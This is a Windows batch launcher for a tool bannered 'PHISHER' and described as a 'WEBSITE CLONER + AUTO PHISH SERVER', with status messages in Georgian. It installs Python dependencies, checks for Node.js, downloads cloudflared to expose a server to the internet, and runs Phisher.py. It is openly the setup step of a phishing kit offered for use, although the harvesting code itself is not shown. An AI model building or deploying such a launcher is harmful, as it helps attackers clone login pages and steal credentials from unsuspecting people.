@echo off
echo.
echo  ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗ 
echo  ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗
echo  ██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝
echo  ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗
echo  ██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║
echo  ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
echo.
echo               WEBSITE CLONER + AUTO PHISH SERVER
echo                         -ALEQSEI
echo.
echo [+] Python ბიბლიოთეკების ინსტალაცია...
pip install -r requirements.txt >nul 2>&1

echo [+] Node.js შემოწმება...
node -v >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Node.js არ არის დაინსტალირებული!
    echo    ჩამოტვირთე: https://nodejs.org
    pause
    exit /b
)

echo [+] cloudflared.exe შემოწმება...
if not exist cloudflared.exe (
    echo [+] cloudflared.exe ჩამოტვირთვა...
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe' -OutFile 'cloudflared.exe'"
)

echo.
echo [+] გაშვება...
python Phisher.py
pause